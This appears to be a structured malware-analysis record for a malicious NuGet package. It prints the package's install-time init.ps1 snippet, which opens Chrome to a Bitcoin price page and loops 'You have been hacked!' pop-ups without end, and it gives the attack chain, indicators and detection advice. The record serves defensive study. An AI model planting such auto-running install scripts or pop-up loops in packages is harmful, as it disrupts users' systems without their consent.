package_info.why_malicious: The package abuses NuGet's auto-executing init.ps1 script to run arbitrary code at install-time. Specifically, it launches a web browser in incognito mode to a cryptocurrency price page and enters an infinite loop displaying disruptive pop-up messages. This demonstrates a clear abuse of install-time script execution, which could be leveraged for more severe attacks such as credential theft, malware delivery, or system compromise.

malicious_snippets.code_snippet:
Start-Process 'chrome.exe' -ArgumentList '--incognito https://www.coindesk.com/price/bitcoin'
while ($true) { [System.Windows.Forms.MessageBox]::Show('You have been hacked! Trick or Treat') }
malicious_snippets.code_behavior: At install-time, the script launches Chrome in incognito mode to a cryptocurrency price page, then enters an infinite loop that creates pop-up message boxes with a prank message, resulting in persistent user disruption.

malice_analysis.why_suspicious: The script is executed automatically during package installation without user consent, launches an external web browser to a third-party site, and creates an infinite loop of pop-up messages, which is highly disruptive and demonstrates the potential for more serious abuse.
malice_analysis.violated_expectations: Legitimate NuGet packages should not execute arbitrary processes, launch browsers, or create persistent UI pop-ups during installation. Such actions are outside the scope of normal package setup and violate user trust and system integrity.
malice_analysis.similar_legitimate_use: Some legitimate packages may use install scripts for environment setup or dependency checks, but they do not launch browsers to unrelated external sites or create prank pop-ups. Persistent UI disruption and browser launching are not expected behaviors.
key_indicators: init.ps1 script with process execution commands (e.g., Start-Process)
Automatic browser launch to external URL during installation
No user interaction required to trigger the behavior
UI manipulation via System.Windows.Forms in install script

attack_chain.action: Upon package installation, the init.ps1 script is automatically executed by the NuGet package manager.
attack_chain.leads_to: Arbitrary code within init.ps1 is run on the user's system without explicit consent.

attack_chain.action: The script launches Chrome in incognito mode, opening a cryptocurrency price page (https://www.coindesk.com/price/bitcoin).
attack_chain.leads_to: User's browser is opened to an external site without their knowledge or approval.

attack_chain.action: The script enters an infinite loop, repeatedly displaying pop-up messages using MessageBox.
attack_chain.leads_to: User is persistently disrupted by pop-up messages, demonstrating the potential for more harmful payloads in similar attacks.

behavioral_signatures: init.ps1 script containing process execution commands (e.g., Start-Process)
Automatic browser launch to external URLs during NuGet package installation
Infinite or repeated MessageBox pop-up creation in install scripts
Use of System.Windows.Forms in install-time scripts
file_indicators: init.ps1 present in NuGet package root
network_indicators: Opening external URLs (e.g., https://www.coindesk.com/price/bitcoin) via browser from install scripts
detection_knowledge.how_to_detect: Scan NuGet packages for the presence of init.ps1 scripts. Analyze script content for process execution commands (such as Start-Process) and UI manipulation (such as MessageBox calls). Flag packages that attempt to launch browsers or create persistent pop-ups during installation, as these behaviors are strong indicators of abuse. Correlate with network monitoring to detect browser launches to external domains from install scripts.
